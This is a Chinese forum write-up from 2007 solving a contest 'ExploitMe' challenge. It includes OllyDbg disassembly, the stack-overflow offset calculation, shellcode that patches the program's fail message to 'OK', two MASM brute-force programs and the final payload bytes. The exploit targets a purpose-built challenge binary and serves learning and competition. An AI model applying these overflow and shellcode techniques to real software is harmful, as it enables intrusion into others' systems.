

# 完全不懂 shellcode 解第二阶段第一题

> 原文：[`www.pediy.com/kssd/pediy09/pediy09-252.htm`](https://www.pediy.com/kssd/pediy09/pediy09-252.htm)

> 【文章标题】: 不懂 shellcode 解第二阶段第一题  
> 【文章作者】: bithaha  
> 【作者声明】: 只是感兴趣，没有其他目的。失误之处敬请诸位大侠赐教!  
> \--------------------------------------------------------------------------------  
> 【详细过程】  
>   不懂溢出和 shellcode，本来想早点打出 GG，结果捣鼓来捣鼓去还真弄出来了。发下解题过程，其中一些弯路就不写了  
>   省的浪费篇幅呵呵。  
>   用 OD 载入，很容易发现里面有个读取 test.txt 文件的过程.于是在目录下新建个 test 文件，随便输入一堆数字 78787878，在  
>   然后点 exploit,OD 停在了如下地方,显示写入\*\*\*\*\*\*\*内存错误：  
>   004002E7  |.  85C9          TEST ECX,ECX  
>   004002E9  |.  7E 05         JLE SHORT ExploitM.004002F0  
>   004002EB  |.  8D7D D4       LEA EDI,DWORD PTR SS:\[EBP-2C\]  
>   004002EE  |.  F3:A5         REP MOVS DWORD PTR ES:\[EDI\],DWORD PTR DS:\[ESI\]             ;  (初始 cpu 选择)  
>   004002F0  |>  5F            POP EDI  
>   004002F1  |.  33C0          XOR EAX,EAX  
>   004002F3  |.  5E            POP ESI  
>   004002F4  |.  C9            LEAVE  
>   004002F5  \\.  C3            RETN  
>   此时 ECX 仍然巨大无比，于是往上找 ecx 怎么来的：  
>   004002A2  |.  68 A802CC78   PUSH 78CC02A8  
>   004002A7  |.  68 1B8F9469   PUSH 69948F1B  
>   004002AC  |.  FF76 04       PUSH DWORD PTR DS:\[ESI+4\]      ;test 文件中第二个双字  
>   004002AF  |.  FF36          PUSH DWORD PTR DS:\[ESI\]         ;第一个双字  
>   004002B1  |.  E8 0A030000   CALL ExploitM.004005C0  
>   004002B6  |.  68 82FFE65B   PUSH 5BE6FF82  
>   004002BB  |.  68 854716A5   PUSH A5164785  
>   004002C0  |.  52            PUSH EDX                      ;上面生成的结果 1  
>   004002C1  |.  50            PUSH EAX                      ;结果 2  
>   004002C2  |.  E8 79020000   CALL ExploitM.00400540        ;返回 eax  
>   004002C7  |.  6A 04         PUSH 4  
>   004002C9  |.  8BCE          MOV ECX,ESI  
>   004002CB  |.  5F            POP EDI  
>   004002CC  |>  8031 1C       /XOR BYTE PTR DS:\[ECX\],1C  
>   004002CF  |.  8A11          |MOV DL,BYTE PTR DS:\[ECX\]  
>   004002D1  |.  3051 01       |XOR BYTE PTR DS:\[ECX+1\],DL  
>   004002D4  |.  41            |INC ECX  
>   004002D5  |.  41            |INC ECX  
>   004002D6  |.  4F            |DEC EDI  
>   004002D7  |.^ 75 F3         \\JNZ SHORT ExploitM.004002CC  
>   004002D9  |.  6A 1A         PUSH 1A                      ;eax 和 1A 捣鼓一下，生成 ecx  
>   004002DB  |.  59            POP ECX  
>   004002DC  |.  2BC8          SUB ECX,EAX  
>   004002DE  |.  0FAFC8        IMUL ECX,EAX  
>   004002E1  |.  81E9 9C000000 SUB ECX,9C  
>   004002E7  |.  85C9          TEST ECX,ECX                   
>   004002E9  |.  7E 05         JLE SHORT ExploitM.004002F0  
>   004002EB  |.  8D7D D4       LEA EDI,DWORD PTR SS:\[EBP-2C\]  
>   话又说回来了，看到这个错误心中狂喜，正愁找不到溢出的地方那，这下可逮住你了。  
>   运行到 004002EE  |.  F3:A5         REP MOVS DWORD PTR ES:\[EDI\],DWORD PTR DS:\[ESI\] 的时候，edi 的值是堆栈中的  
>   地址，我在这个地方修改了一下 ecx 为 1，这样不至于覆盖到下面的返回地址，于是程序照常运行来到此处：  
>   004002EE  |.  F3:A5         REP MOVS DWORD PTR ES:\[EDI\],DWORD PTR DS:\[ESI\]             ;  (初始 cpu 选择)  
>   004002F0  |>  5F            POP EDI  
>   004002F1  |.  33C0          XOR EAX,EAX  
>   004002F3  |.  5E            POP ESI  
>   004002F4  |.  C9            LEAVE  
>   004002F5  \\.  C3            RETN ;返回  
>   在运行到 retn 指令的时候查看一下堆栈地址：12FB48,减去 4002EE 处的 EDI 中的值：12FB18 正好等于 30H，于是要覆盖 12FB48 中的地址才能  
>   完成溢出，覆盖的字节数应为 34H，所以进而得知 ecx=0Dh。  
>   再来搞 shellcode.先把 shellcode 定义为 34H 个字节，前八位先不管,后四位为要覆盖到上面那个返回地址中的值，中间如下:  
>   mov ecx,214B4FH;OK  
>   mov dword ptr \[400260\],ecx ;OK!,修改 fail 为 OK  
>   mov dword ptr \[400268\],ecx;修改 try 为 OK  
>   mov ebp,esp  
>   add ebp,20h;因为 shellcode 要覆盖 ebp 中的内容，而 ebp 中的内容正好是 esp+24H  
>   push 400383;要覆盖的返回地址  
>   ret ;返回到 400383  
>   如果 shellcode 的地址是静态的，直接在 shellcode 的后四位写上地址，配合 4002F5 处的 retn，程序就可以自动返回到 shellcode 执行了  
>   可惜保存 shellcode 的两个地址一个在堆栈中，一个是用 virtualalloc 申请的，都是动态的。  
>   再看看运行到 4002F5 时的堆栈，幸好，在返回地址的下面正好保存着那个用 virtualalloc 申请的 shellcode 地址，现在  
>   只要把 shellcode 的后四位用一个 ret 指令的地址添上，这样两次 ret 正好开始执行 shellcode 了。  
>   下面就是确定前两个双字的问题，我把大量时间都花费了这上面。  
>   因为那两个字节要满足以下条件：  
>   1，经过一系列运算，必须要得出 ecx=0DH  
>   2，那个 xor 1C 过程，生成的结果必须要是指令，而且还得是合适的指令，能执行到真正的 shellcode  
>   其中第一个条件就够整人的了，再加上第二个条件，我又想 GG 了。  
>   最后是用爆破加人工验证来实现的：大概思路是先爆出与 1A 运算得出 ecx 的那个 eax 中的值，然后设后四个四节经过 xor 1C 运算后  
>   的指令为 90 90 90 90（其它也可以比如 1C1C1C1C）,这样后四个字节就是 8C 00 8C 00,第二个双字就是 008C008C  
>   再根据第二个双字和过程 1，枚举出一系列双字，然后从中挑出满足条件的。  
>   详细过程就是两个程序：  
>   程序一：爆破得出 eax，结果为 eax=0DH,耗时 1 秒不到  
>   .386  
>   .model flat,stdcall  
>   option casemap:none  
>   include windows.inc  
>   include user32.inc  
>   includelib user32.lib  
>   include kernel32.inc  
>   includelib kernel32.lib  
>   .data?  
>   szOut db 20 dup (?)  
>   .const   
>   szOK db 'Finished!!',0  
>   szOutFormat db '%x',0  
>   .code  
>   start:  
>   mov eax,00h  
>   @2:  
>   mov ecx,1AH  
>   sub ecx,eax  
>   imul ecx,eax  
>   cmp ecx,0A9h  
>   jz @1  
>   inc eax  
>   jmp @2  
>   @1:  
>   invoke wsprintf,addr szOut,addr szOutFormat,eax  
>   invoke MessageBox,NULL,addr szOut,addr szOK,MB\_OK  
>   invoke ExitProcess,NULL  
>   end start  
>   程序 2：爆破出一系列使得 eax=0DH 的第一个双字（第二个双字刚才确定为 008C008C)，耗时 10 分钟左右  
>   .386  
>   .model flat,stdcall  
>   option casemap:none  
>   include windows.inc  
>   include user32.inc  
>   includelib user32.lib  
>   include kernel32.inc  
>   includelib kernel32.lib  
>     
>   .data  
>   temp dd 0h          
>        db 0h  
>   dd026 dd 008C008CH;//定义的第二个 dword,这些名字都是我当时为了自己好分别起的，没啥意义  
>   dd699 dd 69948F1Bh  
>   dd78c dd 78CC02A8h  
>   dd5be dd 5BE6FF82H  
>   dd0a5 dd 0A5164785h  
>     
>   .data?  
>   ddEDX dd ?  
>   ddEAX dd ?  
>   hFile dd ?  
>   szOutStr db 50 dup (?)  
>   ddWriten dd ?  
>   .const   
>   szOutFamat db '%x',0dh,0ah,0  
>   szOK db 'Finished!!',0  
>   szFileName db 'out.text',0  
>   .code  
>   start:  
>   invoke CreateFile,addr szFileName,GENERIC\_WRITE,FILE\_SHARE\_DELETE,NULL,CREATE\_ALWAYS,FILE\_ATTRIBUTE\_NORMAL,NULL  
>   mov hFile,eax  
>   @1:  
>   mov eax,dd026  
>   mul dd699  
>   mov ebx,eax  
>   mov eax,temp  
>   mul dd78c  
>   add ebx,eax  
>   mov eax,temp  
>   mul dd699  
>   add edx,ebx;  
>   mov ddEDX,edx  
>   mov ddEAX,eax  
>   mov ecx,dd5be  
>   mov ebx,dd0a5  
>   L000:  
>     SHR ECX,1  
>     RCR EBX,1  
>     SHR EDX,1  
>     RCR EAX,1  
>     OR ECX,ECX  
>     JNZ L000  
>   div ebx  
>   mov ecx,eax  
>   mul dd5be  
>   xchg eax,ecx  
>     MUL dd0a5  
>     ADD EDX,ECX  
>     JB L008  
>     CMP EDX,ddEDX  
>     JA L008  
>     JB L010  
>     CMP EAX,ddEAX  
>     JBE L010  
>   L008:  
>     SUB EAX, dd0a5  
>     SBB EDX,dd5be  
>   L010:  
>     SUB EAX,ddEAX  
>     SBB EDX,ddEDX  
>     NEG EDX  
>     NEG EAX  
>     SBB EDX,0  
>     cmp eax,0Dh  
>     jz @2  
>     inc temp  
>     mov eax,temp  
>     cmp eax,0FFFFFFFFH  
>     jz @3  
>     jmp @1  
>     
>   @2:  
>       
>     invoke wsprintf,addr szOutStr,addr szOutFamat,temp  
>     invoke WriteFile,hFile,addr szOutStr,8,addr ddWriten,NULL;输出第一个 dword  
>     inc temp  
>     mov eax,temp  
>     cmp eax,0FFFFFFFFH  
>     jz @3  
>     jmp @1  
>     
>   @3:  
>     invoke MessageBox,NULL,addr szOK,addr szOK,MB\_OK  
>     invoke CloseHandle,hFile  
>     invoke ExitProcess,NULL  
>   end start  
>   在程序 2 完成后共获得两组数据，第一组数据生成的命令是 retF \*\*\*\*,运行不了，晕  
>                                第二组数据(EFF333B5)生成的命令是：  
>                       02A30000    A9 9AEF0090     TEST EAX,9000EF9A  
>                       02A30005    90              NOP  
>                       02A30006    90              NOP  
>                       02A30007    90              NOP  
>   真是爽歪歪，正好满足要求。然后在下面把上面的 shellcode 命令一个一个添上，添上完后在对比着 OD 中的内容用 c32asm 写到 test 文件  
>   里面，修改前八个字节为 B5 33 F3 EF 8C 00 8C 00 后四个双字为 F5 02 40 00（后面这个 00 有无皆可，没有的话 shellcode 就  
>   变成 51 字节了）。  
>   完成！不到之处，往各位大侠多多指教。  
>     
>     
>                                 
>     
>     
>     
>     
> \--------------------------------------------------------------------------------  
> 【版权声明】: 本文原创于看雪技术论坛, 转载请注明作者并保持文章的完整, 谢谢!  
>   
>                                                        2007 年 08 月 30 日 下午 12:00:36 

 4dd466d0e1e0cc123afbe504da2462ca